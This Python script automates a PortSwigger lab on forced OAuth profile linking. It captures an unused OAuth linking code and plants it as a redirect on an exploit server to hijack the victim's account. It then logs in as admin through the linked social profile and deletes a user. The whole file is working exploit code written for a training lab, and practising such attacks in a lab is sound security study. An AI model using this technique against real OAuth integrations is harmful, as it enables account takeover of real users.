#!/usr/bin/env python3
# Forced OAuth profile linking
# Lab-Link: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def login(client, host, username, password):
    url = f'{host}/login'

    r = client.get(url)
    csrf = get_csrf_token(r.text)

    data = {'csrf': csrf,
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def get_oauth_link(client, host):
    url = f'{host}/my-account'
    r = client.get(url)
    try:
        soup = BeautifulSoup(r.text, 'html.parser')
        result = soup.findAll('a', text='Attach a social profile')[0]['href']
    except TypeError:
        return None
    return result


def get_redirect_url(client, host, oauth_link):
    oauth_url_details = urllib3.util.parse_url(oauth_link)    
    oauth_host = f'{oauth_url_details.scheme}://{oauth_url_details.host}'

    def get_login_form_target(text):
        try:
            soup = BeautifulSoup(text, 'html.parser')
            result = soup.find('form', attrs={'class': 'login-form'})['action']
        except TypeError:
            return None
        return result

    def get_confirm_form_target(text):
        try:
            soup = BeautifulSoup(text, 'html.parser')
            result = soup.find('form', attrs={'method': 'post'})['action']
        except TypeError:
            return None
        return result

    def get_redirect_target(url):
        # The confirmation starts a redirect flow that finalizes at the web application.
        # Thus, I need to forbid redirects and perform the requests manually        
        try:
            r = client.post(url, allow_redirects=False)
            r = client.get(r.headers['Location'], allow_redirects=False)
            redirect_target = r.headers['Location']
        except TypeError:
            return None
        return redirect_target


    # Initiates the interaction and redirects to OAuth login    
    r = client.get(oauth_link)
    login_target = get_login_form_target(r.text)
    if not login_target:
        print(f'[-] Failed to obtain login target from OAuth form')
        return None

    url = f'{oauth_host}{login_target}'
    data = {
        'username': 'peter.wiener',
        'password': 'hotdog'
    }
    r = client.post(url, data=data)
    confirm_target = get_confirm_form_target(r.text)
    if not confirm_target:
        print(f'[-] Failed to obtain confirm target from OAuth form')
        return None

    url = f'{oauth_host}{confirm_target}'
    redirect_target = get_redirect_target(url)
    if 'oauth-linking?code' not in redirect_target:
        print(f'[-] Failed to extract redirect target from OAuth response')
        return None

    return redirect_target


def store_exploit(client, exploit_server, redirect_url):
    data = {'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': '''HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location:''' + redirect_url,
            'responseBody': 'Nothing here...',
            'formAction': 'STORE'}

    return client.post(exploit_server, data=data).status_code == 200


def oauth_login(client, host):   
    def get_oauth_login_link(client, host):
        url = f'{host}/login'
        r = client.get(url)
        try:
            soup = BeautifulSoup(r.text, 'html.parser')
            result = soup.findAll('a', text='Login with social media')[0]['href']
        except TypeError:
            return None
        return result

    oauth_link = get_oauth_login_link(client, host)
    if not oauth_link:
        print(f'[-] Failed to obtain OAuth sign in link')
        return None
    print(f'[+] Obtained OAuth sign in link: {oauth_link}')

    r = client.get(oauth_link)
    return "You have successfully logged in with your social media account" in r.text


def main():
    print('[+] Forced OAuth profile linking')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        exploit_server = find_exploitserver(client.get(host).text)
        if exploit_server is None:
            print(f'[-] Failed to find exploit server')
            sys.exit(-2)
        print(f'[+] Exploit server: {exploit_server}')

        if not login(client, host, 'wiener', 'peter'):
            print(f'[-] Failed to login as wiener')
            sys.exit(-3)
        print(f'[+] Logged in as wiener')

        oauth_link = get_oauth_link(client, host)
        if not oauth_link:
            print(f'[-] Failed to find link to OAuth provider')
            sys.exit(-4)
        print(f'[+] Found link to OAuth provider: {oauth_link}')

        redirect_url = get_redirect_url(client, host, oauth_link)
        if not redirect_url:
            print(f'[-] Failed to obtain redirect URL')
            sys.exit(-5)
        print(f'[+] Logged in with OAuth provider')
        print(f'[+] Obtained redirect URL: {redirect_url}')

        if not store_exploit(client, exploit_server, redirect_url):
            print(f'[-] Failed to store exploit file')
            sys.exit(-6)
        print(f'[+] Stored exploit file')

        if client.get(f'{exploit_server}/deliver-to-victim', allow_redirects=False).status_code != 302:
            print(f'[-] Failed to deliver exploit to victim')
            sys.exit(-7)
        print(f'[+] Delivered exploit to victim')

        if client.get(f'{host}/logout', allow_redirects=False).status_code != 302:
            print(f'[-] Failed to logout as wiener')
            sys.exit(-8)
        print(f'[+] Logged out as wiener')

        if not oauth_login(client, host):
            print(f'[-] Failed to login with social media account')
            sys.exit(-10)
        print(f'[+] Logged in with social media account')

        url = f'{host}/admin/delete?username=carlos'
        if client.get(f'{url}', allow_redirects=False).status_code != 302:
            print(f'[-] Failed to delete user carlos')
            sys.exit(-12)
        print(f'[+] Apparently deleted user carlos')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-99)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
